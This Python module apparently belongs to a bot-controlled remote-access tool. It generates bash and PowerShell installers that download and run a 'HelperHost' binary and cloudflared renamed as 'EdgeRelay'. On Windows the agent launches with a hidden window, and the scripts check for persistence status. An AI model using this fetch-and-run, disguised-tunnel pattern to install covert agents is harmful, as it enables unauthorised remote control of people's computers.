from __future__ import annotations

"""Bootstrap — downloads HelperHost from GitHub Releases + EdgeRelay. Zero system deps."""

from pathlib import Path

from app import config

PAYLOAD_DIR = Path(__file__).resolve().parent.parent / "pc_payload"
AGENT_SRC = PAYLOAD_DIR / "agent.py"  # legacy reference only
DIST_DIR = PAYLOAD_DIR / "dist"


def agent_source() -> str:
    return AGENT_SRC.read_text(encoding="utf-8")


def github_helper_url(os_name: str, arch: str) -> str:
    os_name = (os_name or "").lower()
    arch = (arch or "").lower()
    if arch in ("x86_64", "x64", "amd64"):
        arch = "amd64"
    elif arch in ("aarch64", "arm64"):
        arch = "arm64"
    base = config.GITHUB_RELEASE_BASE
    if os_name in ("darwin", "mac", "macos"):
        return f"{base}/HelperHost-darwin-{arch}"
    if os_name in ("windows", "win"):
        return f"{base}/HelperHost-windows-{arch}.exe"
    return f"{base}/HelperHost-linux-{arch}"


def helper_binary_path(os_name: str, arch: str) -> Path | None:
    os_name = (os_name or "").lower()
    arch = (arch or "").lower()
    if arch in ("x86_64", "x64", "amd64"):
        arch = "amd64"
    elif arch in ("aarch64", "arm64"):
        arch = "arm64"
    if os_name in ("darwin", "mac", "macos"):
        name = f"HelperHost-darwin-{arch}"
    elif os_name in ("windows", "win"):
        name = f"HelperHost-windows-{arch}.exe"
    else:
        name = f"HelperHost-linux-{arch}"
    path = DIST_DIR / name
    return path if path.is_file() else None


def bash_bootstrap_script(enroll: str, base: str | None = None) -> str:
    base = (base or config.BASE_URL).rstrip("/")
    gh = config.GITHUB_RELEASE_BASE
    return f"""#!/usr/bin/env bash
set -euo pipefail
ENROLL='{enroll}'
BOT_BASE='{base}'
GH='{gh}'
# persistent install dir
if [ "$(uname -s)" = "Darwin" ]; then
  DIR="$HOME/Library/Application Support/HelperHost"
else
  DIR="$HOME/.local/share/HelperHost"
fi
CACHE="${{TMPDIR:-/tmp}}/HelperHostCache"
mkdir -p "$DIR" "$CACHE"
cd "$DIR"

pkill -f "$DIR/HelperHost" 2>/dev/null || true
pkill -f "$DIR/EdgeRelay" 2>/dev/null || true
sleep 0.2

ARCH="$(uname -m)"
OS="$(uname -s)"
case "$ARCH" in
  x86_64|amd64) ARCH_N=amd64 ;;
  aarch64|arm64) ARCH_N=arm64 ;;
  *) echo "arch non supportée: $ARCH" >&2; exit 1 ;;
esac
case "$OS" in
  Darwin) OS_N=darwin; HH=HelperHost ;;
  Linux)  OS_N=linux;  HH=HelperHost ;;
  *) echo "OS non supporté: $OS" >&2; exit 1 ;;
esac

restore_or_fetch() {{
  local name="$1" url="$2"
  if [ -x "$DIR/$name" ]; then
    cp -f "$DIR/$name" "$CACHE/$name" 2>/dev/null || true
    return 0
  fi
  if [ -f "$CACHE/$name" ]; then
    cp -f "$CACHE/$name" "$DIR/$name"
    chmod +x "$DIR/$name"
    return 0
  fi
  echo "prep $name…"
  curl -fsSL "$url" -o "$CACHE/$name.download"
  cp -f "$CACHE/$name.download" "$CACHE/$name"
  cp -f "$CACHE/$name" "$DIR/$name"
  chmod +x "$DIR/$name"
}}

# HelperHost = binaire unique (Go) depuis GitHub Releases. Aucun Python.
restore_or_fetch "$HH" "$GH/HelperHost-$OS_N-$ARCH_N"

# EdgeRelay = cloudflared renommé
if [ "$OS" = "Darwin" ]; then
  if [ "$ARCH_N" = "arm64" ]; then U="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64"
  else U="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64"; fi
else
  if [ "$ARCH_N" = "arm64" ]; then U="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
  else U="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"; fi
fi
restore_or_fetch EdgeRelay "$U"

printf '%s\\n' "{{\\"enroll\\":\\"$ENROLL\\",\\"bot_base\\":\\"$BOT_BASE\\"}}" > "$DIR/config.json"
export AGENTSHE_ENROLL="$ENROLL" AGENTSHE_BOT_BASE="$BOT_BASE"

# Lance le binaire — pas de .py, pas de runtime Python
nohup "$DIR/$HH" >"$DIR/boot.log" 2>&1 &
for i in $(seq 1 180); do
  if grep -q '^OK$' "$DIR/boot.log" 2>/dev/null; then
    grep -E '^(OK|agent=|autostart=|reboot=|watchdog=|proc_|deps=)' "$DIR/boot.log" || true
    exit 0
  fi
  if grep -q '^FAIL' "$DIR/boot.log" 2>/dev/null; then cat "$DIR/boot.log" >&2; exit 1; fi
  sleep 1
done
echo timeout >&2; tail -n 40 "$DIR/boot.log" >&2 || true; exit 1
"""


def powershell_bootstrap_script(enroll: str, base: str | None = None) -> str:
    base = (base or config.BASE_URL).rstrip("/")
    gh = config.GITHUB_RELEASE_BASE
    return f"""$ErrorActionPreference = 'Stop'
$Enroll = '{enroll}'
$BotBase = '{base}'
$Gh = '{gh}'
$Dir = Join-Path $env:LOCALAPPDATA 'HelperHost'
$Cache = Join-Path $env:TEMP 'HelperHostCache'
New-Item -ItemType Directory -Force -Path $Dir,$Cache | Out-Null
Get-Process HelperHost,EdgeRelay -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

function Restore-OrFetch([string]$Name, [string]$Url) {{
  $dest = Join-Path $Dir $Name
  $cached = Join-Path $Cache $Name
  if (Test-Path $dest) {{ Copy-Item $dest $cached -Force -ErrorAction SilentlyContinue; return }}
  if (Test-Path $cached) {{ Copy-Item $cached $dest -Force; return }}
  $part = Join-Path $Cache ($Name + '.download')
  Write-Host ("prep " + $Name + "…")
  Invoke-WebRequest -UseBasicParsing -Uri $Url -OutFile $part
  Copy-Item $part $cached -Force
  Copy-Item $cached $dest -Force
}}

# HelperHost.exe = binaire unique (Go) depuis GitHub Releases. Aucun Python.
Restore-OrFetch 'HelperHost.exe' "$Gh/HelperHost-windows-amd64.exe"
Restore-OrFetch 'EdgeRelay.exe' 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe'

@{{ enroll = $Enroll; bot_base = $BotBase }} | ConvertTo-Json | Set-Content -Encoding UTF8 (Join-Path $Dir 'config.json')
$env:AGENTSHE_ENROLL = $Enroll
$env:AGENTSHE_BOT_BASE = $BotBase
$Helper = Join-Path $Dir 'HelperHost.exe'
$log = Join-Path $Dir 'boot.log'
Start-Process -WindowStyle Hidden -FilePath $Helper -WorkingDirectory $Dir -RedirectStandardOutput $log -RedirectStandardError $log
$ok = $false
for ($i=0; $i -lt 180; $i++) {{
  Start-Sleep -Seconds 1
  if (Test-Path $log) {{
    $txt = Get-Content $log -Raw -ErrorAction SilentlyContinue
    if ($txt -match '(?m)^OK$') {{
      Select-String -Path $log -Pattern '^(OK|agent=|autostart=|reboot=|watchdog=|proc_|deps=)' | ForEach-Object {{ $_.Line }}
      $ok = $true; break
    }}
    if ($txt -match 'FAIL') {{ Get-Content $log; throw 'install failed' }}
  }}
}}
if (-not $ok) {{ throw 'timeout' }}
"""
